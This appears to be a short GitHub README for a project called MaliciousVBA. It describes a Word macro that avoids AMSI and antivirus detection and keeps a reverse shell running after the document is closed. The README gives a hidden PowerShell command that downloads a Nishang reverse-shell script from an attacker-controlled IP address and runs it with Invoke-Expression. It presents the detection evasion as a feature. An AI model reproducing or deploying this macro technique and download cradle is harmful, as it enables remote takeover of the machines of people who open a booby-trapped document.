# MaliciousVBA

I was reading various articles on how other go about bypassing AMSI using VBA. A great article can be found on this blog [codewhitesec](https://codewhitesec.blogspot.com/2019/07/heap-based-amsi-bypass-in-vba.html).

Instead of trying to replicate that I chose a different route. I tried to use the powershell command Invoke-Experession to download [Nikhil's](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell script.


## Running Powershell in VBA

In order to run powershell commands using VBA I have used the code published in Microsoft's Docs [here](https://docs.microsoft.com/en-us/office/vba/access/concepts/windows-api/determine-when-a-shelled-process-ends). The code is ideal for this project because it doesn't get flagged by the Antivirus or AMSI and also spawns a seperate process, which means that even if the user closes Word we won't lose our reverse shell (or whatevet the payload of choice is). 

## Powershell Command 
The command I wanted to run in this macro is the following:

```sh
Powershell.exe -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.246/1234567892222.ps1')
```
